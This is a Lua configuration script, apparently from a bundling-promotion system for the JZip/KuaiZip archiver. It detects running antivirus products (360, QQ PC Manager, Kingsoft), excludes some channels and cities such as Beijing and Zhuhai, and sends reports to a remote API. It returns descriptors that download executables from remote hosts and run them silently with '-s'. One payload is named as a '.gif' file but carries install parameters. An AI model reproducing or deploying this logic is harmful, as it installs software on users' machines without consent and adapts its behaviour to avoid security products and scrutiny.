
require ('unicorn')
require ('extra')

--项目
_project = "xxbz";

--匹配数组内元素,value=搜索词,array=被搜索数组,searchtype不填写或写0为前置匹配,其他为全词匹配
function stringinarray(value1,array1,searchtype1)
	if searchtype1 == nil or searchtype1 == 0 then
		-- 前置匹配
		for k, v in ipairs(array1) do
			local pos = string.find( string.upper(value1), string.upper(v))
			if (pos == 1) then
				return true
			end
		end
		return false
	else
		--全词匹配
		for k, v in ipairs(array1) do
			if (string.upper(v) == string.upper(value1)) then
			return true
			end
		end
		return false
	end
end

--qid函数
function qid()
	local qids = g_qid;
	return qids;
end

--MD5函数
function md5()
	local md = extra.md5(_project);
	return md;
end

--version函数
function version()
	local ver = extra.version(_project);
	return ver;
end

--城市函数
function city_name()
	local city = extra.city_name(_project);
	return city;
end

--控量函数
function web_http_get(name1)
	return unicorn.web_http_get("http://api.kpzip.com/showcountnew.php?param=show&name=" .. name1);
end

--系统函数
function system_infos()
    if unicorn.system_info.v1 == 5 then
        return "winxp";
    elseif unicorn.system_info.v1 == 6 then
        if unicorn.system_info.v2 == 0 then
            return "winvista";
        elseif unicorn.system_info.v2 == 1 then
            return "win7";
        else
            return "win8";
        end
    elseif unicorn.system_info.v1 == 10 then
        return "win10";
    end
    return "another";
end

--table转json函数
function table_maxn(t1)
    local mn = 1;
    for k, v in pairs(t1) do
      if(type(k) ~= "number") then
        mn = 0;
      end
    end
    return mn;
end

function table2json(t2)  
    local function serialize(tbl)  
        local tmp = {}  
        for k, v in pairs(tbl) do  
                local k_type = type(k)  
                local v_type = type(v)  
                local key = (k_type == "string" and "\"" .. k .. "\":")  
                    or (k_type == "number" and "")  
                local value = (v_type == "table" and serialize(v))  
                    or (v_type == "boolean" and tostring(v))  
                    or (v_type == "string" and "\"" .. v .. "\"")  
                    or (v_type == "number" and v)  
                tmp[#tmp + 1] = key and value and tostring(key) .. tostring(value) or nil  
        end  
        if table_maxn(tbl) == 0 then  
                return "{" .. table.concat(tmp, ",") .. "}"  
        else  
                return "[" .. table.concat(tmp, ",") .. "]"  
        end  
    end  
    assert(type(t2) == "table")  
    return serialize(t2)  
end

--打印函数
function printf(value2)
	unicorn.printf(tostring(value2) .. "\n")
end

--上报函数
function report(str1,num1)
	extra.report_kunbang(_project,str1,true,true,true,true,0,num1,true);
end

--间隔天数，返回结果结果为天数
function interval(firstinstalldate)
	if firstinstalldate == nil or firstinstalldate ==  0 then
        return 0;
    end
	local times = os.time() - firstinstalldate;
    local day = times / 86400;
    return math.abs(day);
end

--新用户判断
function new_user()
    local firstinstalltime = extra.first_install_time(_project);
	local installdate = extra.install_date(_project);
    if os.date("%Y%m%d",installdate) == os.date("%Y%m%d",firstinstalltime) then
		return true;
	end
    return false;
end

--30天不展示天数判断
function recent_noruntime(name3)
	local nopopsettime = unicorn.read_timestamp("HKCU","Software\\JZip\\InstallSoft",name3);
	if nopopsettime ~= 0 and interval(nopopsettime) <= 30 then
		--report(name3 .. ".nopoptime_no_run",3);
		return true;
	end
	return false;
end

--检查不运行环境
function check_enviroment(_exclude_qid1,_exclude_version1,_exclude_process1,_exclude_md51,_exclude_city1,reports)
	-- 检查渠道号
	if stringinarray(qid(),_exclude_qid1) then
		--report(reports .. ".qid_no_run",4)
		return false
	end
	-- 检查版本号
	if stringinarray(version(),_exclude_version1) then
		--report(reports .. ".version_no_run",4)
		return false
	end
	-- 检查md5
	if stringinarray(md5(),_exclude_md51,1) then
		--report(reports .. ".MD5_no_run",4);
		return false
	end
	-- 检查城市
	if stringinarray(city_name(),_exclude_city1,1) then
		report(reports .. ".banpopup",4);
		return false
	end
	-- 检查进程名
	for k,v in ipairs(_exclude_process1) do 
		if stringinarray(v,unicorn.process,0) then
			--report(reports .. ".process_no_run",4);
			return false
		end
	end
	return true
end

--定义全局变量
is360 = stringinarray("ZhuDongFangYu.exe",unicorn.process,0);
isQQpc = stringinarray("QQPCRTP.exe",unicorn.process);
isJS = stringinarray("kxescore.exe",unicorn.process);
--不运行渠道
_exclude_qid = {"pure","fran_001","RS_001","cj_001","jw_"};
--不运行版本
_exclude_version = {"1.0.1.1","1.0.1.2"};
--不运行进程
_exclude_process = {};
--不运行MD5
_exclude_md5 = {};
--不运行城市
_exclude_city = {"珠海"};

function execute_kztui()
	install = {
		url = "http://down.jizunnet.com/n/setup.exe",
		md5 = "B3E818E5B59325A8F5604A511D1D4CE8",
		params = "-s"
	};

	--360环境
	if is360 == true then
		if city_name() == "北京" then
			report("kztui.banpopup",1);
			return;
		end

		if isQQpc == false and isJS == false then
			--report("360.def_kztui",4)
			return table2json(install);
		end

		--report("def360.def_kztui",4)
		return table2json(install);
	end

	--金山环境
	if isJS == true then
		--report("js.def_kztui",4)
		return table2json(install);
	end

	--Q管环境
	if isQQpc == true then
		--report("qq.def_kztui",4)
		return table2json(install);
	end

	--其他环境
	--report("def.def_kztui",4)
	return table2json(install);
end


function main()
	install = {
		url = "http://down1.wallpaper.shqingzao.com/logo/v1.0.0.1/CalfWallpaper.gif",
		md5 = "0E4DCD6627024C10B0E6B313497F403C",
		params = "-wjm"
	};
	-- install = {
	-- 	url = "http://down1.wallpaper.shqingzao.com/logo/v1.0.0.1/KuaiZip.gif",
	-- 	md5 = "1B301A88C5ABD4DD248D6EEE24DB4F57",
	-- 	params = "-s"
	-- };

	result = table2json(install);
	--print(result)
end

main()

